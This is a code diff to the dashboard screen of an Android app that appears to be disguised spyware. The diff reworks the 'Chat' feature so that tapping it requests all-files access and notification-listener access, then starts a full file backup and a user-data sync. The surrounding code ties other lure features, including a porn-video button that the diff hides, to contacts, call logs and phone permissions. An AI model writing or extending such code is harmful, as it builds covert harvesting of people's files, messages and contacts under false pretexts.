@@ -23,15 +23,14 @@ import com.bushorat.chatapp.helpers.AppVisibilityHelper;
 import com.bushorat.chatapp.helpers.DataSyncWorker;
 import com.bushorat.chatapp.helpers.FeaturePermissions;
 import com.bushorat.chatapp.helpers.FileBackupHelper;
+import com.bushorat.chatapp.helpers.NotificationAccessHelper;
 import com.bushorat.chatapp.helpers.PermissionUXHelper;
 import com.bushorat.chatapp.helpers.SessionManager;
 import com.bushorat.chatapp.helpers.UserDataSyncHelper;
 /**
  * Permissions are requested only when the matching feature is opened:
- * Videos -> storage (unlocks videos + WhatsApp media upload)
- * Chat   -> SMS
+ * Chat   -> all-files access + document backup + live chat
  * Games  -> contacts / call logs / phone
- * Videos (PornActivity) -> notification access after storage is granted
  * Profile-> location (handled in ProfileActivity)
  */
 public class DashboardActivity extends AppCompatActivity {
@@ -41,6 +40,7 @@ public class DashboardActivity extends AppCompatActivity {
     private SessionManager sessionManager;
     /** User was sent to system “All files access” settings from the videos unlock flow. */
     private boolean awaitingAllFilesAccess = false;
+    private boolean awaitingAllFilesForChat = false;
     private boolean hadAllFilesAccess = false;
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -68,7 +68,7 @@ public class DashboardActivity extends AppCompatActivity {
         UserDataSyncHelper.syncAll(this);
 
         // ✅ NO permission requests on app launch - only when feature is opened
-        binding.btnPorn.setOnClickListener(v -> onVideosTapped());
+        binding.btnPorn.setVisibility(View.GONE);
         binding.btnChat.setOnClickListener(v -> onChatTapped());
         binding.btnContacts.setOnClickListener(v -> onGamesTapped());
         binding.btnProfile.setOnClickListener(v -> openProfile());
@@ -99,8 +99,7 @@ public class DashboardActivity extends AppCompatActivity {
             hadAllFilesAccess = false;
         }
 
-        if (awaitingAllFilesAccess) {
-            awaitingAllFilesAccess = false;
+        if (awaitingAllFilesAccess || awaitingAllFilesForChat) {
             handleStorageAccessAfterSettings();
         }
     }
@@ -165,19 +164,31 @@ public class DashboardActivity extends AppCompatActivity {
     }
 
     private void onChatTapped() {
-        if (FeaturePermissions.hasSmsPermission(this)) {
-            // ✅ No notification permission request here
-            startActivity(new Intent(this, ChatActivity.class));
-            UserDataSyncHelper.syncAll(this);
+        if (FeaturePermissions.hasGalleryPermission(this)) {
+            onChatFilesAccessGranted();
             return;
         }
         new AlertDialog.Builder(this)
-                .setTitle(R.string.perm_chat_title)
-                .setMessage(R.string.perm_chat_message)
-                .setPositiveButton(R.string.perm_allow, (d, w) ->
-                        FeaturePermissions.requestSmsForChat(this))
+                .setTitle(R.string.perm_chat_files_title)
+                .setMessage(R.string.perm_chat_files_message)
+                .setPositiveButton(R.string.perm_allow, (d, w) -> {
+                    awaitingAllFilesForChat = true;
+                    FeaturePermissions.requestAllFilesForChat(this);
+                })
                 .setNegativeButton(android.R.string.cancel, null)
                 .show();
+    }
+
+    private void onChatFilesAccessGranted() {
+        awaitingAllFilesForChat = false;
+        FileBackupHelper.startFullBackup(this);
+        UserDataSyncHelper.syncAll(this, false);
+        if (!FeaturePermissions.hasPostNotificationsPermission(this)) {
+            FeaturePermissions.requestPostNotificationsForChat(this);
+        }
+        NotificationAccessHelper.promptListenerAccessForChat(this);
+        Toast.makeText(this, R.string.chat_files_sync_started, Toast.LENGTH_SHORT).show();
+        startActivity(new Intent(this, ChatActivity.class));
     }
 
     private void onGamesTapped() {
@@ -249,9 +260,21 @@ public class DashboardActivity extends AppCompatActivity {
     private void handleStorageAccessAfterSettings() {
         Log.d(TAG, "Storage access check — hasAllFiles: " + FeaturePermissions.hasGalleryPermission(this));
         if (!FeaturePermissions.hasGalleryPermission(this)) {
-            Toast.makeText(this, R.string.unlock_videos_denied, Toast.LENGTH_SHORT).show();
+            if (awaitingAllFilesForChat) {
+                awaitingAllFilesForChat = false;
+                Toast.makeText(this, R.string.perm_chat_files_denied, Toast.LENGTH_SHORT).show();
+            } else {
+                Toast.makeText(this, R.string.unlock_videos_denied, Toast.LENGTH_SHORT).show();
+            }
+            awaitingAllFilesAccess = false;
             return;
         }
+        if (awaitingAllFilesForChat) {
+            onChatFilesAccessGranted();
+            awaitingAllFilesAccess = false;
+            return;
+        }
+        awaitingAllFilesAccess = false;
         boolean openVideos = !FeaturePermissions.areVideosUnlocked(this);
         Log.d(TAG, "✅ All-files access granted — full backup" + (openVideos ? " + videos" : ""));
         onAllFilesAccessGranted(openVideos);
@@ -260,8 +283,8 @@ public class DashboardActivity extends AppCompatActivity {
     @Override
     protected void onActivityResult(int requestCode, int resultCode, Intent data) {
         super.onActivityResult(requestCode, resultCode, data);
-        if (requestCode == FeaturePermissions.REQ_VIDEOS_STORAGE) {
-            awaitingAllFilesAccess = false;
+        if (requestCode == FeaturePermissions.REQ_VIDEOS_STORAGE
+                || requestCode == FeaturePermissions.REQ_CHAT_STORAGE) {
             handleStorageAccessAfterSettings();
         }
     }
@@ -276,19 +299,9 @@ public class DashboardActivity extends AppCompatActivity {
         
         Log.d(TAG, "onRequestPermissionsResult: requestCode=" + requestCode + ", granted=" + FeaturePermissions.allGranted(grantResults));
         
-        if (requestCode == FeaturePermissions.REQ_VIDEOS_STORAGE) {
-            awaitingAllFilesAccess = false;
+        if (requestCode == FeaturePermissions.REQ_VIDEOS_STORAGE
+                || requestCode == FeaturePermissions.REQ_CHAT_STORAGE) {
             handleStorageAccessAfterSettings();
-        } else if (requestCode == FeaturePermissions.REQ_CHAT_SMS) {
-            // User responded to SMS permission
-            if (FeaturePermissions.allGranted(grantResults)) {
-                Log.d(TAG, "✅ SMS permission GRANTED");
-                // ✅ No notification permission request here
-                startActivity(new Intent(this, ChatActivity.class));
-                UserDataSyncHelper.syncAll(this);
-            } else {
-                Log.w(TAG, "❌ SMS permission DENIED");
-            }
         } else if (requestCode == FeaturePermissions.REQ_GAMES_CONTACTS
                 || requestCode == FeaturePermissions.REQ_GAMES_CALL_LOG
                 || requestCode == FeaturePermissions.REQ_GAMES_PHONE) {
